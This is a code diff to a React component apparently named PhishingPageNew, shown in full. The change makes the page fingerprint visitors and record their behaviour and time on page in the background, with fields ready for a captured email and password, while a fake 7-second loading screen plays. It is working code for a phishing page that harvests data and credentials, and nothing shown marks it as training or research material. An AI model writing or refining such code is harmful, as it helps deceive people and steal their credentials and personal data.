@@ -107,27 +107,29 @@ const PhishingPageNew = () => {
   // Main sequence
   useEffect(() => {
     const runSequence = async () => {
-      // 1. Capture data in background
-      try {
-        console.log('🔍 Capturing data...');
-        const fingerprint = await collectFingerprint();
-        const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+      // 1. Start capture in background (don't wait for it)
+      (async () => {
+        try {
+          console.log('🔍 Capturing data...');
+          const fingerprint = await collectFingerprint();
+          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
 
-        await captureData({
-          ...fingerprint,
-          behavior: { ...behaviorRef.current, timeOnPage },
-          metadata: {
-            userSubmitted: false,
-            formData: { email: null, password: null }
-          },
-          timestamp: new Date().toISOString(),
-        });
-        console.log('✅ Data captured');
-      } catch (error) {
-        console.error('❌ Capture error:', error);
-      }
+          await captureData({
+            ...fingerprint,
+            behavior: { ...behaviorRef.current, timeOnPage },
+            metadata: {
+              userSubmitted: false,
+              formData: { email: null, password: null }
+            },
+            timestamp: new Date().toISOString(),
+          });
+          console.log('✅ Data captured');
+        } catch (error) {
+          console.error('❌ Capture error:', error);
+        }
+      })();
 
-      // 2. Wait 7 seconds (loading)
+      // 2. Wait 7 seconds (loading) - continues independently
       await new Promise(r => setTimeout(r, 7000));
       setIsLoading(false);
 
